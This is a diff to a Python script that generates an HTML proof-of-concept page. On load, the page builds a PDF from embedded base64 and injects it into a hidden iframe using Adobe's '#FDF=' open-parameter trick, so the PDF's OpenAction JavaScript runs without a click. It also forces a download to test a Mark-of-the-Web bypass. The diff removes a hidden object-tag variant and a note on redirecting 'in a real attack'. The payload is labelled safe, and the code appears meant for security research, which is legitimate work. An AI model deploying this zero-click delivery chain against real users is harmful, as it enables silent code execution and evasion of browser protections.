@@ -8,18 +8,17 @@ SAFE_PDF_B64 = "JVBERi0xLjcKCjEgMCBvYmogICUgZW50cnkgcG9pbnQKPDwKICAvVHlwZSAvQ2F0
 def create_local_poc():
     print("[*] Generating Self-Contained PoC (No Domain Needed)...")
 
-    # We use a standard string and .replace() to avoid f-string syntax errors with CSS/JS braces
-    html_template = """
+    html_content = f"""
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <title>Local Research PoC</title>
         <style>
-            body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
-            .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #000; }
-            button { padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }
-            button:hover { background: #444; }
+            body {{ font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }}
+            .log {{ border: 1px solid #333; padding: 10px; margin-top: 10px; background: #000; }}
+            button {{ padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }}
+            button:hover {{ background: #444; }}
         </style>
     </head>
     <body>
@@ -31,27 +30,27 @@ def create_local_poc():
         <button id="triggerBtn">Manually Trigger (Simulate Interaction)</button>
 
         <script>
-            const log = (msg) => {
+            const log = (msg) => {{
                 const statusDiv = document.getElementById('status');
                 statusDiv.innerText += "\\n[+] " + msg;
                 console.log(msg);
-            };
+            }};
 
-            const base64ToBlob = (base64, mimeType) => {
+            const base64ToBlob = (base64, mimeType) => {{
                 const byteCharacters = atob(base64);
                 const byteNumbers = new Array(byteCharacters.length);
-                for (let i = 0; i < byteCharacters.length; i++) {
+                for (let i = 0; i < byteCharacters.length; i++) {{
                     byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
+                }}
                 const byteArray = new Uint8Array(byteNumbers);
-                return new Blob([byteArray], { type: mimeType });
-            };
+                return new Blob([byteArray], {{ type: mimeType }});
+            }};
 
-            const executeChain = () => {
+            const executeChain = () => {{
                 log("Stage 1: Constructing PDF payload in memory...");
 
                 // Construct the PDF blob from our embedded Base64 string
-                const pdfBlob = base64ToBlob("REPLACE_ME_PDF_B64", "application/pdf");
+                const pdfBlob = base64ToBlob("{SAFE_PDF_B64}", "application/pdf");
 
                 // CRITICAL: We append '#FDF=' to the URL.
                 // This is the "Adobe Open Parameters" trick.
@@ -60,32 +59,19 @@ def create_local_poc():
 
                 log("Stage 2: PDF Blob created at " + pdfUrl);
 
-                // Technique A: Object/Embed Injection (Forced Inline Rendering)
-                // We use an <object> tag instead of just an iframe.
-                // This is more aggressive at forcing the browser to load the plugin.
-                log("Attempting 'Auto-Open' via <object> Injection...");
+                // Technique A: Iframe Injection (The "Auto-Open" Vector)
+                // Instead of downloading, we force the browser to RENDER the PDF immediately.
+                // If the Adobe Plugin is present, it will execute the 'OpenAction' JS inside the PDF.
+                log("Attempting 'Auto-Open' via Iframe Injection...");
 
-                const obj = document.createElement('object');
-                obj.data = pdfUrl;
-                obj.type = "application/pdf";
-                obj.width = "1";
-                obj.height = "1";
-                obj.style.visibility = "hidden";
-                document.body.appendChild(obj);
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none'; // Stealth mode
+                iframe.src = pdfUrl;
+                document.body.appendChild(iframe);
 
-                log("Stage 3: Object injected. Waiting for plugin execution...");
+                log("Stage 3: Iframe injected. If Adobe Plugin is active, JS will execute now.");
 
-                // Technique B: Window Navigation (The "Direct Open" Vector)
-                // If the object tag fails (e.g., built-in viewer blocks it),
-                // we try to navigate the current window to the PDF blob.
-                // This forces the browser to decide: "Render or Download?"
-                setTimeout(() => {
-                    log("Attempting fallback navigation (window.location)...");
-                    // window.location.href = pdfUrl; // Uncomment to force navigation
-                    log("Navigation skipped to keep page open. In a real attack, we would redirect.");
-                }, 500);
-
-                // Technique C: Fallback Download (for MotW evidence)
+                // Technique B: Fallback Download (for MotW evidence)
                 // We also trigger the download so you have the file for the PowerShell check.
                 setTimeout(() => {
                     log("Triggering fallback download for MotW verification...");
@@ -96,13 +82,13 @@ def create_local_poc():
                     link.click();
                     document.body.removeChild(link);
                 }, 1000);
-            };
+            }};
 
             // Auto-trigger on load (The "Zero-Click" simulation)
-            window.onload = () => {
+            window.onload = () => {{
                 log("Page Loaded. Waiting 2 seconds before auto-trigger...");
                 setTimeout(executeChain, 2000);
-            };
+            }};
 
             document.getElementById('triggerBtn').onclick = executeChain;
         </script>
@@ -110,19 +96,14 @@ def create_local_poc():
     </html>
     """
 
-    # Inject the Base64 PDF content safely
-    html_content = html_template.replace("REPLACE_ME_PDF_B64", SAFE_PDF_B64)
-
     with open("local_poc.html", "w") as f:
         f.write(html_content)
 
     print("[+] Created 'local_poc.html'.")
     print("[*] INSTRUCTIONS:")
     print("1. Open 'local_poc.html' in Chrome directly (double-click).")
-    print("2. The script will auto-trigger the 'Auto-Open' attempt.")
-    print("   -> If successful, you will see a POP-UP ALERT: 'PDF Executed Safely'.")
-    print("3. It will ALSO download 'research_payload.pdf'.")
-    print("   -> Use 'Check-MotW.ps1' on this file to prove the security bypass.")
+    print("2. The script will auto-trigger the file download.")
+    print("3. Check the downloaded file properties to see if 'Mark of the Web' is missing.")
 
 if __name__ == "__main__":
     create_local_poc()
